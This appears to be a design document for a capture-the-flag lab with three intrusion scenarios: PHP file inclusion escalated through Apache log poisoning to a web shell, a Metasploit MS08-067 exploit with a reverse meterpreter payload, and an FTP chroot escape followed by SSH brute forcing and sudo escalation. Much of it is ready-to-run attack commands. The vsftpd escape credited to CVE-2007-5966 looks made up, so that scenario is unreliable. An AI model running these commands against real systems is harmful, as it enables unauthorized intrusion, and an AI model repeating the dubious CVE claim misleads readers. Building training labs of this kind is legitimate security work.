
**Host Descriptions:**
*   **Router/GW:** `gateway.ctf2010.local`
    *   OS: Debian Linux 5.0 (Lenny) or CentOS 5.
    *   Role: NAT, basic iptables firewall.
*   **Web-Srv:** `webserver.ctf2010.local`
    *   OS: Ubuntu Server 10.04 LTS.
    *   Services: Apache 2.2 + PHP 5.3.x.
*   **Client:** `client-pc.ctf2010.local`
    *   OS: Windows XP SP3 / Windows 7.
    *   Details: Legacy browser (Firefox 3.6), outdated software.
*   **Internal-Server:** `internal.ctf2010.local`
    *   OS: CentOS 5.
    *   Services: vsftpd, ProFTPD, Samba, SSH on a non-standard port.

---

### Scenario 1: Web Server Attack (LFI -> RCE)

**Objective:** Gain a remote shell on `webserver.ctf2010.local` and retrieve the flag from `/home/www-data/flag.txt`.

**Infrastructure:**
*   **Target:** `webserver.ctf2010.local` (Linux)
*   **Service:** Apache 2.2.14 + PHP 5.3.2
*   **Web App:** A simple PHP site with navigation like `index.php?page=news.html`.

**Vulnerability:**
*   **Local File Inclusion (LFI):** The `index.php` script uses the `page` parameter without proper sanitization.
    *   Vulnerable Code: `<?php include($_GET['page']); ?>`
*   **Insecure PHP Configuration:** `register_globals = On` and `allow_url_include = Off` (default).

**Attack Steps:**
1.  **Reconnaissance:** Port scanning (nmap) reveals open port 80 (HTTP).
2.  **Vulnerability Discovery:**
    *   Test: `http://webserver.ctf2010.local/index.php?page=../../../../etc/passwd`
    *   Success is confirmed if the contents of `/etc/passwd` are displayed in the response.
3.  **Escalation to RCE (Remote Code Execution):**
    *   **Method 1: Apache Log Poisoning.** Force the server to write PHP code into log files (e.g., `access.log`) via the User-Agent header, then include the log file via LFI.
        *   `curl -A "<?php system(\$_GET['cmd']); ?>" http://webserver.ctf2010.local/`
        *   `http://webserver.ctf2010.local/index.php?page=../../../../var/log/apache2/access.log&cmd=id`
    *   **Method 2: `/proc/self/environ` Inclusion.** If the User-Agent is stored in an environment variable and included via `/proc/self/environ`, this can be exploited similarly.
4.  **Command Execution:** Execute commands to find and read the flag: `&cmd=cat /home/www-data/flag.txt`.

**Player's Challenge:**
"Identify and exploit a critical vulnerability in the company's website to achieve remote code execution. Locate the confidential flag file on the server."

---

### Scenario 2: Windows Client Attack (SMB + Buffer Overflow)

**Objective:** Gain full control of `client-pc.ctf2010.local` and find the `flag.txt` file on the user's Desktop.

**Infrastructure:**
*   **Target:** `client-pc.ctf2010.local` (Windows XP SP3)
*   **Services:** SMB (Server Message Block - ports 139/445). Critical patches (like MS08-067) are not installed.

**Vulnerability:**
*   **MS08-067 (CVE-2008-4250):** A critical remote code execution vulnerability in the Server Service. It allows an attacker to run arbitrary code without authentication.

**Attack Steps:**
1.  **Reconnaissance:** Network scanning identifies host `10.0.1.20` with port 445 (SMB) open.
2.  **Vulnerability Confirmation:** Use a vulnerability scanner (e.g., a classic Nessus plugin or a standalone Nmap NSE script) to check for MS08-067.
3.  **Exploitation:**
    *   Launch Metasploit Framework (version 3.x).
    *   `use exploit/windows/smb/ms08_067_netapi`
    *   `set RHOST 10.0.1.20`
    *   `set PAYLOAD windows/meterpreter/reverse_tcp`
    *   `exploit`
4.  **Gaining Access:** A successful exploit will provide a `meterpreter` shell session on the compromised Windows host.
5.  **Flag Retrieval:** Use meterpreter commands to search the filesystem: `search -f flag.txt`, or navigate manually: `shell` -> `dir C:\Documents and Settings\USER\Desktop\flag.txt`.

**Player's Challenge:**
"An employee's workstation in the corporate network is missing critical security updates. Exploit a well-known operating system vulnerability to compromise the machine and retrieve a sensitive file."

---

### Scenario 3: Internal Service Attack (FTP + Privilege Escalation)

A multi-stage attack focusing on service exploitation and misconfiguration.

**Objective:** Gain root access on `internal.ctf2010.local` and read the final flag from `/root/flag.txt`.

**Infrastructure:**
*   **Target:** `internal.ctf2010.local` (Linux, CentOS 5)
*   **Services:** vsftpd 2.0.5 (vulnerable version), SSH on port 2222.

**Vulnerabilities:**
1.  **CVE-2007-5966:** A vulnerability in the chroot mechanism of vsftpd 2.0.5 that allows an authenticated user to escape the chroot jail and access the full filesystem.
2.  **Privilege Escalation via Sudo:** The local user `ftpadmin` has full sudo privileges without a password (`NOPASSWD: ALL` in `/etc/sudoers`).

**Attack Steps:**
1.  **Reconnaissance:** Scanning the target (`10.0.2.30`) reveals ports 21 (FTP) and 2222 (SSH).
2.  **FTP Attack:**
    *   Connect: `ftp 10.0.2.30`
    *   Login: Use anonymous access (or weak credentials like `admin:admin`).
    *   **Exploit vsftpd Chroot Escape:** Use the `CWD` command to traverse outside the chroot: `CWD .../.../.../.../.../.../.../.../.../.../`
    *   This allows listing and downloading system files like `/etc/passwd` and `/etc/sudoers`.
3.  **Analysis & Privilege Escalation:**
    *   Analyze the downloaded `/etc/sudoers` file. Discover the line: `ftpadmin ALL=(ALL) NOPASSWD: ALL`.
    *   This means the user `ftpadmin` can become root with the command `sudo su`.
4.  **SSH Access & Root:**
    *   Brute-force or guess the password for the user `ftpadmin` over SSH on port 2222 (using a tool like `hydra` or a simple wordlist).
    *   Once logged in via SSH, escalate to root: `sudo su -`.
    *   `cat /root/flag.txt`.

**Player's Challenge:**
"Breach the internal file server by exploiting a vulnerability in its FTP service. Analyze the system's configuration to find a path to elevate your privileges to root and access the final flag."
